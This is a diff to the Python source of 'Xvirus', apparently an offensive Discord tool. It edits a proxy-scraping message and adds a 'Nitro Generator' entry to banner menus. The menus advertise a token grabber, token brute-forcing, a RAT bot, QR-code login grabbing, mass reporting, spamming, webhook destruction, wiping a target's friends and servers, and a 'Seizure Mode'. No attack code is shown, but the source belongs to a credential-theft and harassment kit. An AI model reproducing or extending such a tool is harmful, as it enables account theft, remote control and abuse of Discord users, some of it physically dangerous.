@@ -412,7 +412,7 @@ def proxy_scrape():
     startTime = time.time()
     #create temp dir
     temp = os.getenv("temp")+"\\xvirus_proxies"
-    print(f"""{Fore.BLUE}Please wait while {Fore.RED}Xvirus{Fore.BLUE} Scrapes proxies for you!\n(This might take some time)""")
+    print(f"""{Fore.BLUE}Please wait while {Fore.RED}Xvirus{Fore.BLUE} Scrapes proxies for you!\n(This might take some time)\nIf you have been in this page for too long restart the program!""")
     
 
     def fetchProxies(url, custom_regex):
@@ -656,7 +656,7 @@ def banner(theme=None):
 {Fore.RED}[{Fore.RED}02{Fore.RED}]{Fore.LIGHTBLACK_EX} Unfriend all friends                        |{Fore.RED}[{Fore.RED}11{Fore.RED}]{Fore.LIGHTBLACK_EX} Profile Changer               |{Fore.RED}[{Fore.RED}20{Fore.RED}]{Fore.LIGHTBLACK_EX} Discord Rat Bot 
 {Fore.RED}[{Fore.RED}03{Fore.RED}]{Fore.LIGHTBLACK_EX} Delete and leave all servers                |{Fore.RED}[{Fore.RED}12{Fore.RED}]{Fore.LIGHTBLACK_EX} Token Brute-Force             |{Fore.RED}[{Fore.RED}21{Fore.RED}]{Fore.LIGHTBLACK_EX} Vanity Sniper
 {Fore.RED}[{Fore.RED}04{Fore.RED}]{Fore.LIGHTBLACK_EX} Spam Create New servers                     |{Fore.RED}[{Fore.RED}13{Fore.RED}]{Fore.LIGHTBLACK_EX} Token Grabber                 |{Fore.RED}[{Fore.RED}22{Fore.RED}]{Fore.LIGHTBLACK_EX} Dm Clearer (WIP)
-{Fore.RED}[{Fore.RED}05{Fore.RED}]{Fore.LIGHTBLACK_EX} Dm Deleter                                  |{Fore.RED}[{Fore.RED}14{Fore.RED}]{Fore.LIGHTBLACK_EX} QR Code grabber               |{Fore.RED}[{Fore.RED}23{Fore.RED}]{Fore.LIGHTBLACK_EX} [Coming Soon]
+{Fore.RED}[{Fore.RED}05{Fore.RED}]{Fore.LIGHTBLACK_EX} Dm Deleter                                  |{Fore.RED}[{Fore.RED}14{Fore.RED}]{Fore.LIGHTBLACK_EX} QR Code grabber               |{Fore.RED}[{Fore.RED}23{Fore.RED}]{Fore.LIGHTBLACK_EX} Nitro Generator
 {Fore.RED}[{Fore.RED}06{Fore.RED}]{Fore.LIGHTBLACK_EX} Mass Dm                                     |{Fore.RED}[{Fore.RED}15{Fore.RED}]{Fore.LIGHTBLACK_EX} Mass Report                   |{Fore.RED}[{Fore.RED}24{Fore.RED}]{Fore.LIGHTBLACK_EX} [Coming Soon]
 {Fore.RED}[{Fore.RED}07{Fore.RED}]{Fore.LIGHTBLACK_EX} Enable Seizure Mode                         |{Fore.RED}[{Fore.RED}16{Fore.RED}]{Fore.LIGHTBLACK_EX} GroupChat Spammer             |{Fore.RED}[{Fore.RED}25{Fore.RED}]{Fore.LIGHTBLACK_EX} [Coming Soon]
 {Fore.RED}[{Fore.RED}08{Fore.RED}]{Fore.LIGHTBLACK_EX} Get information from a targetted account    |{Fore.RED}[{Fore.RED}17{Fore.RED}]{Fore.LIGHTBLACK_EX} Webhook Destroyer             |{Fore.RED}[{Fore.RED}26{Fore.RED}]{Fore.LIGHTBLACK_EX} [Coming Soon]
@@ -685,7 +685,7 @@ def bannerTheme(type1, type2):
 [02] Unfriend all friends                        |[11] Profile Changer               |[20] Discord Rat Bot 
 [03] Delete and leave all servers                |[12] Token Brute-Force             |[21] Vanity Sniper
 [04] Spam Create New servers                     |[13] Token Grabber                 |[22] Dm Clearer (WIP)
-[05] Dm Deleter                                  |[14] QR Code grabber               |[23] [Coming Soon]
+[05] Dm Deleter                                  |[14] QR Code grabber               |[23] Nitro Generator
 [06] Mass Dm                                     |[15] Mass Report                   |[24] [Coming Soon]
 [07] Enable Seizure Mode                         |[16] GroupChat Spammer             |[25] [Coming Soon]
 [08] Get information from a targetted account    |[17] Webhook Destroyer             |[26] [Coming Soon]
